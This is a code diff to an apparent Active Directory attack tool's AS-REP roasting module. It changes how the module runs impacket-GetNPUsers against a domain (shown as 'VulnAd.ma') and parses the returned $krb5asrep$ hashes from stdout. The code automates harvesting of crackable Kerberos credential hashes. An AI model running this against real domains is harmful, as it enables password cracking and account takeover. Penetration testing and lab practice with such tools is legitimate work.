@@ -214,42 +214,31 @@ class ASREPRoastingModule:
         )
 
         # ── Run GetNPUsers ──────────────────────────────────────────────
-        # Exact working command (no -dc-ip, no -no-pass — matches manual):
+        # Exact working command — no -outputfile, no -dc-ip, no -no-pass:
         #   impacket-GetNPUsers VulnAd.ma/ -usersfile users-rid.txt
         #
-        # -outputfile points at the real report file so hashes are read back.
+        # When -outputfile IS passed, impacket silences stdout and only writes
+        # to the file.  Without it, hashes print to stdout — we capture those
+        # and save the file ourselves.
         command = [
             binary,
             f"{domain}/",
-            "-usersfile",  tmp_path,
-            "-outputfile", hash_file_path,
+            "-usersfile", tmp_path,
         ]
 
         from rich.console import Console as _RCon
         _RCon().print(
             f"  [dim]Command: {binary} {domain}/ "
-            f"-usersfile <{len(user_pool)} users> "
-            f"-outputfile <hash_file>[/dim]"
+            f"-usersfile <{len(user_pool)} users>[/dim]"
         )
 
         result   = self.executor.run(command)
         combined = result["output"] + "\n" + result["error"]
 
-        # ── Parse hashes ────────────────────────────────────────────────
-        # Primary: read the -outputfile impacket wrote to.
-        # Fallback: scan stdout/stderr (some impacket versions differ).
-        hashes: list[str] = []
-
-        if os.path.isfile(hash_file_path):
-            try:
-                with open(hash_file_path, "r", encoding="utf-8", errors="replace") as fh:
-                    hashes = _parse_hashes(fh.read())
-            except OSError:
-                pass
-
-        if not hashes:
-            hashes = _parse_hashes(combined)
-
+        # ── Parse hashes from stdout ─────────────────────────────────────
+        # impacket prints $krb5asrep$... lines directly to stdout when
+        # no -outputfile is given.
+        hashes           = _parse_hashes(combined)
         vulnerable_users = _parse_vulnerable_users("\n".join(hashes))
 
         if not hashes:
@@ -273,6 +262,7 @@ class ASREPRoastingModule:
                     "or impacket could not reach the DC.",
                 ],
             }
+
 
 
         # ── Save hashes to file ─────────────────────────────────────────
